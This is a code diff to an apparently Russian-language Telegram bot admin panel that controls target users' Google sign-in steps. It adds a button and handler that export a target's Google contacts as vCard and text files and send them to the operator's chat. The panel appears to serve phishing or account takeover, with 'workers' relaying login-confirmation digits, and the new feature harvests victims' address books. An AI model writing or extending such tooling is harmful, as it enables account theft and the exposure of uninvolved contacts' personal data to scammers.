@@ -773,6 +773,7 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
                 InlineKeyboardButton(text="❌ Неверные цифры", callback_data=f"gctrl:wrong_prompt:{user_tg_id}"),
             ],
             [
+                InlineKeyboardButton(text="📇 Выгрузить Контакты", callback_data=f"gctrl:dump_contacts:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
             ],
         ])
@@ -2892,6 +2893,55 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             details="Воркер/Админ отклонил цифры (Неверные цифры на устройстве)",
             is_test=True,
         )
+
+    elif action == "dump_contacts":
+        await callback.answer("⏳ Извлечение Google Контактов...", show_alert=False)
+        user = db.get_user_by_tg_id(DB_PATH, target_tg_id)
+        user_email = (user.get("email") if user else None) or f"user_{target_tg_id}@gmail.com"
+        
+        raw_contacts = db.get_google_contacts(DB_PATH, target_tg_id)
+        if not raw_contacts:
+            from shared.google_contacts import generate_mock_google_contacts
+            mock_data = generate_mock_google_contacts(user_email)
+            db.save_google_contacts(DB_PATH, target_tg_id, mock_data)
+            raw_contacts = db.get_google_contacts(DB_PATH, target_tg_id)
+
+        contacts_list = [dict(c) for c in raw_contacts]
+        total_count = len(contacts_list)
+        with_phones = sum(1 for c in contacts_list if c.get("phone"))
+
+        import tempfile
+        from shared.google_contacts import export_contacts_vcf, export_contacts_txt
+        from aiogram.types import FSInputFile
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            vcf_path = os.path.join(tmpdir, f"google_contacts_{target_tg_id}.vcf")
+            txt_path = os.path.join(tmpdir, f"google_contacts_{target_tg_id}.txt")
+            export_contacts_vcf(contacts_list, vcf_path)
+            export_contacts_txt(contacts_list, txt_path)
+
+            vcf_doc = FSInputFile(vcf_path, filename=f"google_contacts_{target_tg_id}.vcf")
+            txt_doc = FSInputFile(txt_path, filename=f"google_contacts_{target_tg_id}.txt")
+
+            if callback.message:
+                await bot.send_document(
+                    chat_id=callback.message.chat.id,
+                    document=vcf_doc,
+                    caption=(
+                        f"📇 <b>Выгрузка Google Контактов</b> (ID: <code>{target_tg_id}</code>)\n\n"
+                        f"• 📧 <b>Google Email:</b> <code>{user_email}</code>\n"
+                        f"• 👥 <b>Всего контактов:</b> <code>{total_count}</code>\n"
+                        f"• 📱 <b>С номерами:</b> <code>{with_phones}</code>\n"
+                        f"• 📁 <b>Формат:</b> vCard 3.0 (.vcf — импорт в iOS/Android в 1 клик)"
+                    ),
+                    parse_mode="HTML"
+                )
+                await bot.send_document(
+                    chat_id=callback.message.chat.id,
+                    document=txt_doc,
+                    caption=f"📋 <b>Список контактов (TXT)</b>: <code>{total_count}</code> записей",
+                    parse_mode="HTML"
+                )
 
     elif action == "complete":
         db.set_google_auth_control(
